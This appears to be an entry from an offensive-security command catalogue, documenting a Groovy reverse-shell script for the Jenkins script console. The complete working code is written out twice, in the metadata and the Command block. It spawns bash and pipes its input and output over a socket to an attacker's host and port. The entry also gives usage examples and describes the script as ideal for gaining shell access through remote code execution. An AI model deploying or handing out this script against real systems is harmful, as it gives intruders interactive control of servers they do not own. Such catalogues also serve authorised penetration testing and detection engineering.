---
id: cmd-groovy-reverse-shell-001
data: >-
  String host="your_server_ip"; int port=1337; String cmd="bash"; Process p=new
  ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
  Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),
  si=s.getInputStream();OutputStream
  po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
  {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
tags:
  - reverse-shell
  - rce
  - groovy
type: command
output: null
executor: groovy
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.264Z'
verified: false
validated: true
submitted: true
---
# groovy-reverse-shell

## Command

```groovy
String host="your_server_ip"; int port=1337; String cmd="bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Description

Groovy script for Jenkins console to create a reverse TCP shell using bash, forwarding I/O streams via sockets. Ideal for RCE to gain shell access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| host | Attacker's IP address | Yes |
| port | Listening port (default 1337) | Yes |
| cmd | Shell to spawn (e.g., bash) | Yes |

## Examples

### Basic Usage

```groovy
String host="192.168.1.100"; int port=1337; String cmd="bash"; // ... rest of script
```

### Advanced Usage

Change shell to sh:
```groovy
String cmd="sh"; // ... rest
```

## Expected Output

No console output; establishes connection to listener for interactive shell.

## Related

- [[Related Procedure|procedures/Establish-Reverse-Shell-via-Jenkins-Groovy-Script]]
